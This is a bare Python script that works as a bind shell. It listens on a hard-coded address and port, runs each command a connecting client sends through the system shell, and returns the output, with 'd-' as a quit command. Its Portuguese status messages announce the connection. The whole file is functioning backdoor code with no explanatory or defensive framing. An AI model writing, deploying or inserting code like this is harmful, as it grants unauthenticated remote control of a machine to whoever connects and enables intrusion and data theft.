import socket
import subprocess

HOST = "192.168.0.111"
PORT = 176  

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print('[+] Server Started')
    print('[+] Listening For Client Connection ...')
    conn, addr = s.accept()
    conn.sendall(b'Conectado')
    with conn:
        print(f"[+] Connected by {addr}")
        while True:
            data = conn.recv(2048)
            command = data.decode('utf-8')
            if command == 'd-':
                print('Cancelando conexão')
                break
            op = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            file = op.stdout.read()
            outpt = file.decode("latin1")
            output = outpt
            output_error = op.stderr.read()
            conn.sendall(output.encode() + output_error)
